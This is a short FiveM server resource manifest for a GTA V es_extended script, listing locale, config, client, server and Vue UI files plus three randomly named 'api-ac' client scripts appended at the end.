fx_version "bodacious"

games {"gta5"}
lua54 'yes'

version '1.2.0'

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

ui_page 'ui/index.html'

files {
	'ui/index.html',
	'ui/vue.min.js',
	'ui/script.js'
}


client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"